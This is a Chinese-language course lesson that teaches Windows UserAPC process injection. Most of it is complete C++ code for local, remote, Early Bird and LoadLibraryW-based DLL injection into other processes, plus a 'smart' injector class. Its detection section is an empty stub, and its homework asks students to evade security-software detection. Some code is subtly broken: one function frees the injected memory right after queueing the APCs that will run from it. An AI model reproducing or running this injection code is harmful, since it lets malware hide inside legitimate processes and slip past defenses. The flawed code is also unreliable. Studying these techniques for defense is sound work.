# 课时04 - UserAPC注入

## 课程目标
1. 理解APC(异步过程调用)机制
2. 掌握QueueUserAPC API的使用方法
3. 实现基于APC的代码注入技术
4. 了解该技术的检测与防护方法

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| APC | Asynchronous Procedure Call | 异步过程调用 |
| QueueUserAPC | - | 向线程APC队列添加用户模式APC的API |
| Alertable | 可警醒状态 | 线程处于可接收APC的状态 |
| Early Bird | 早期鸟 | 在进程初始化前注入APC的技术 |
| IAT | Import Address Table | 导入地址表 |

## 技术原理

### 1. APC机制概述

APC(异步过程调用)是Windows提供的一种机制，允许在特定线程的上下文中异步执行函数。当线程处于"可警醒"(Alertable)状态时，系统会检查该线程的APC队列，如果有APC函数，则会执行它们。

```
APC工作原理:
┌─────────────────────────────────────────────────────────────┐
│                    APC注入者                               │
│  1. OpenThread() 获取目标线程句柄                          │
├─────────────────────────────────────────────────────────────┤
│  2. QueueUserAPC() 向线程APC队列添加函数                   │
├─────────────────────────────────────────────────────────────┤
│  3. 等待线程进入可警醒状态                                 │
└─────────────────────────────────────────────────────────────┘

目标线程:
┌─────────────────────────────────────────────────────────────┐
│  4. 调用可警醒函数(如SleepEx, WaitForSingleObjectEx等)      │
├─────────────────────────────────────────────────────────────┤
│  5. 系统检查APC队列                                        │
├─────────────────────────────────────────────────────────────┤
│  6. 执行APC函数                                            │
└─────────────────────────────────────────────────────────────┘
```

### 2. 可警醒状态函数

线程只有在调用以下函数时才会进入可警醒状态：

- SleepEx()
- WaitForSingleObjectEx()
- WaitForMultipleObjectsEx()
- SignalObjectAndWait()
- MsgWaitForMultipleObjectsEx()

### 3. APC注入类型

#### 3.1 本地APC注入
在当前进程中向线程添加APC。

#### 3.2 远程APC注入
在其他进程中向线程添加APC。

#### 3.3 Early Bird注入
在进程创建初期就注入APC，使其在进程初始化时执行。

## 代码实现

### 1. 基础APC注入

```cpp
// apc_injection.cpp
// UserAPC注入实现

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

//=============================================================================
// 方法1: 本地APC注入
//=============================================================================
DWORD WINAPI AlertableThread(LPVOID param) {
    printf("[THREAD] Alertable thread started\n");
    
    // 持续处于可警醒状态
    while (TRUE) {
        printf("[THREAD] Sleeping in alertable state...\n");
        SleepEx(5000, TRUE);  // 可警醒睡眠
    }
    
    return 0;
}

BOOL LocalAPCInjection() {
    printf("[*] Method 1: Local APC Injection\n");
    
    // 1. 创建可警醒线程
    HANDLE hThread = CreateThread(
        NULL,
        0,
        AlertableThread,
        NULL,
        0,
        NULL
    );
    
    if (!hThread) {
        printf("[-] CreateThread failed: %lu\n", GetLastError());
        return FALSE;
    }
    
    printf("[+] Alertable thread created\n");
    
    // 2. 等待线程进入可警醒状态
    Sleep(100);
    
    // 3. 分配可执行内存
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90,  // NOP sled
        0x31, 0xC0,              // xor eax, eax
        0x40,                    // inc eax
        0xC3                     // ret
    };
    
    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!execMem) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        return FALSE;
    }
    
    // 4. 复制ShellCode
    memcpy(execMem, shellcode, sizeof(shellcode));
    
    // 5. 向线程队列添加APC
    if (QueueUserAPC((PAPCFUNC)execMem, hThread, 0)) {
        printf("[+] APC queued successfully\n");
    } else {
        printf("[-] QueueUserAPC failed: %lu\n", GetLastError());
        VirtualFree(execMem, 0, MEM_RELEASE);
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        return FALSE;
    }
    
    // 6. 等待一段时间观察效果
    Sleep(6000);
    
    // 7. 清理
    VirtualFree(execMem, 0, MEM_RELEASE);
    TerminateThread(hThread, 0);
    CloseHandle(hThread);
    
    printf("[+] Local APC injection completed\n");
    return TRUE;
}

//=============================================================================
// 方法2: 远程APC注入
//=============================================================================
BOOL RemoteAPCInjection(DWORD targetPid, const void* shellcode, SIZE_T shellcodeSize) {
    printf("[*] Method 2: Remote APC Injection to PID %lu\n", targetPid);
    
    // 1. 打开目标进程
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE,
        targetPid
    );
    
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }
    
    // 2. 在目标进程中分配内存
    LPVOID remoteMem = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Allocated remote memory at: %p\n", remoteMem);
    
    // 3. 写入ShellCode到目标进程
    if (!WriteProcessMemory(
            hProcess,
            remoteMem,
            shellcode,
            shellcodeSize,
            NULL)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 4. 枚举目标进程的所有线程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    int apcCount = 0;
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            // 检查是否为目标进程的线程
            if (te.th32OwnerProcessID == targetPid) {
                // 打开线程句柄
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    // 向线程队列添加APC
                    if (QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0)) {
                        printf("[+] APC queued to thread %lu\n", te.th32ThreadID);
                        apcCount++;
                    } else {
                        printf("[-] QueueUserAPC failed for thread %lu: %lu\n", 
                               te.th32ThreadID, GetLastError());
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    
    if (apcCount == 0) {
        printf("[-] No APCs were queued\n");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Queued APCs to %d threads\n", apcCount);
    
    // 5. 清理
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    printf("[+] Remote APC injection completed\n");
    return TRUE;
}
```

### 2. Early Bird APC注入

```cpp
//=============================================================================
// 方法3: Early Bird APC注入
//=============================================================================
BOOL EarlyBirdAPCInjection(LPCWSTR targetExe, const void* shellcode, SIZE_T shellcodeSize) {
    printf("[*] Method 3: Early Bird APC Injection\n");
    printf("[*] Target executable: %ws\n", targetExe);
    
    // 1. 以挂起状态创建目标进程
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    if (!CreateProcessW(
            targetExe,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi)) {
        printf("[-] CreateProcessW failed: %lu\n", GetLastError());
        return FALSE;
    }
    
    printf("[+] Created suspended process: PID=%lu\n", pi.dwProcessId);
    
    // 2. 在目标进程中分配内存
    LPVOID remoteMem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    printf("[+] Allocated remote memory at: %p\n", remoteMem);
    
    // 3. 写入ShellCode
    if (!WriteProcessMemory(
            pi.hProcess,
            remoteMem,
            shellcode,
            shellcodeSize,
            NULL)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    // 4. 向主线程队列添加APC
    if (!QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0)) {
        printf("[-] QueueUserAPC failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    printf("[+] APC queued to main thread\n");
    
    // 5. 恢复线程执行(APC将在进程初始化时执行)
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[-] ResumeThread failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    printf("[+] Thread resumed, APC should execute early\n");
    
    // 6. 清理
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    printf("[+] Early Bird APC injection completed\n");
    return TRUE;
}

//=============================================================================
// 方法4: APC注入DLL加载器
//=============================================================================
BOOL APCInjectDllLoader(DWORD targetPid, LPCWSTR dllPath) {
    printf("[*] Method 4: APC DLL Loader Injection\n");
    
    // 1. 打开目标进程
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE,
        targetPid
    );
    
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }
    
    // 2. 获取LoadLibraryW地址
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
    
    if (!pLoadLibraryW) {
        printf("[-] GetProcAddress failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] LoadLibraryW address: %p\n", pLoadLibraryW);
    
    // 3. 在目标进程中分配内存存储DLL路径
    size_t dllPathLen = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID remoteDllPath = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!remoteDllPath) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Allocated memory for DLL path at: %p\n", remoteDllPath);
    
    // 4. 写入DLL路径
    if (!WriteProcessMemory(
            hProcess,
            remoteDllPath,
            dllPath,
            dllPathLen,
            NULL)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 5. 枚举并注入APC到目标线程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    int apcCount = 0;
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == targetPid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    // 向线程队列添加APC调用LoadLibraryW
                    if (QueueUserAPC((PAPCFUNC)pLoadLibraryW, hThread, (ULONG_PTR)remoteDllPath)) {
                        printf("[+] APC queued to LoadLibraryW on thread %lu\n", te.th32ThreadID);
                        apcCount++;
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    
    if (apcCount == 0) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Queued LoadLibraryW APCs to %d threads\n", apcCount);
    
    // 6. 清理(不立即释放内存，因为LoadLibraryW还在使用)
    CloseHandle(hProcess);
    
    printf("[+] APC DLL loader injection completed\n");
    return TRUE;
}
```

### 3. 高级APC技术

```cpp
//=============================================================================
// 方法5: 组合APC注入技术
//=============================================================================
class APCInjector {
private:
    DWORD m_targetPid;
    
public:
    APCInjector(DWORD targetPid) : m_targetPid(targetPid) {}
    
    // 智能APC注入(选择最佳线程)
    BOOL SmartAPCInjection(const void* shellcode, SIZE_T shellcodeSize) {
        printf("[*] Smart APC Injection\n");
        
        // 1. 打开目标进程
        HANDLE hProcess = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
            FALSE,
            m_targetPid
        );
        
        if (!hProcess) {
            return FALSE;
        }
        
        // 2. 分配内存
        LPVOID remoteMem = VirtualAllocEx(
            hProcess,
            NULL,
            shellcodeSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        if (!remoteMem) {
            CloseHandle(hProcess);
            return FALSE;
        }
        
        // 3. 写入ShellCode
        WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL);
        
        // 4. 查找最佳线程(主线程优先)
        DWORD mainThreadId = FindMainThread(m_targetPid);
        BOOL success = FALSE;
        
        if (mainThreadId != 0) {
            HANDLE hMainThread = OpenThread(THREAD_SET_CONTEXT, FALSE, mainThreadId);
            if (hMainThread) {
                if (QueueUserAPC((PAPCFUNC)remoteMem, hMainThread, 0)) {
                    printf("[+] APC queued to main thread %lu\n", mainThreadId);
                    success = TRUE;
                }
                CloseHandle(hMainThread);
            }
        }
        
        // 5. 如果主线程注入失败，尝试其他线程
        if (!success) {
            success = InjectToAllThreads(hProcess, remoteMem);
        }
        
        // 6. 清理
        if (!success) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        }
        CloseHandle(hProcess);
        
        return success;
    }
    
private:
    // 查找主线程
    DWORD FindMainThread(DWORD processId) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return 0;
        }
        
        THREADENTRY32 te = { sizeof(THREADENTRY32) };
        DWORD mainThreadId = 0;
        
        if (Thread32First(hSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == processId) {
                    // 简化处理：假设第一个线程是主线程
                    mainThreadId = te.th32ThreadID;
                    break;
                }
            } while (Thread32Next(hSnapshot, &te));
        }
        
        CloseHandle(hSnapshot);
        return mainThreadId;
    }
    
    // 注入到所有线程
    BOOL InjectToAllThreads(HANDLE hProcess, LPVOID remoteMem) {
        DWORD processId = GetProcessId(hProcess);
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return FALSE;
        }
        
        THREADENTRY32 te = { sizeof(THREADENTRY32) };
        int successCount = 0;
        
        if (Thread32First(hSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == processId) {
                    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                    if (hThread) {
                        if (QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0)) {
                            successCount++;
                        }
                        CloseHandle(hThread);
                    }
                }
            } while (Thread32Next(hSnapshot, &te));
        }
        
        CloseHandle(hSnapshot);
        return successCount > 0;
    }
};

// 使用示例
void DemonstrateAPCInjection() {
    printf("========================================\n");
    printf("     APC Injection Demo                 \n");
    printf("========================================\n\n");
    
    // 示例1: 本地APC注入
    LocalAPCInjection();
    
    printf("\n");
    
    // 示例2: 智能APC注入(需要目标进程PID)
    // DWORD targetPid = GetProcessIdByName(L"notepad.exe");
    // if (targetPid) {
    //     APCInjector injector(targetPid);
    //     unsigned char testShellcode[] = { 0xC3 }; // 简单ret指令
    //     injector.SmartAPCInjection(testShellcode, sizeof(testShellcode));
    // }
}
```

## 检测与防护

### 1. 常见检测方法

| 检测方式 | 原理 | 绕过难度 |
|----------|------|----------|
| APC监控 | 监控QueueUserAPC调用 | 中 |
| 线程状态分析 | 分析线程的可警醒状态 | 高 |
| 内存扫描 | 扫描可执行内存中的可疑代码 | 中 |
| 行为分析 | 检测异常的DLL加载行为 | 高 |

### 2. 防护措施

```cpp
// APC注入检测示例
#include <windows.h>
#include <tlhelp32.h>

// 检测异常APC活动
BOOL DetectSuspiciousAPCActivity() {
    // 枚举所有进程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    DWORD currentPid = GetCurrentProcessId();
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            // 跳过当前进程
            if (pe.th32ProcessID != currentPid) {
                // 检查进程中的线程APC活动
                CheckProcessAPCActivity(pe.th32ProcessID);
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return FALSE;
}

// 检查特定进程的APC活动
void CheckProcessAPCActivity(DWORD processId) {
    // 这里需要更复杂的实现
    // 可以检查线程的APC队列状态
    // 或监控QueueUserAPC调用
}

// 防护APC注入
void ProtectAgainstAPCInjection() {
    printf("[PROTECTION] APC injection protection initialized\n");
    
    // 1. 监控QueueUserAPC调用
    // 2. 验证线程APC队列的完整性
    // 3. 检测异常的可执行内存分配
}
```

## 课后作业

### 作业1：实现APC注入绕过
研究如何绕过安全软件对APC注入的检测，实现更隐蔽的注入。

### 作业2：完善主线程查找
改进代码中的FindMainThread函数，准确识别目标进程的主线程。

### 作业3：实现AtomBombing技术
研究并实现AtomBombing注入技术，这是APC注入的一种变种。

## 参考资料

1. Windows Internals, Part 1: System architecture, processes, threads, memory management
2. 《恶意代码分析实战》- Michael Sikorski & Andrew Honig
3. 《The Rootkit Arsenal》- Bill Blunden
4. MSDN文档: QueueUserAPC, SleepEx, CreateProcess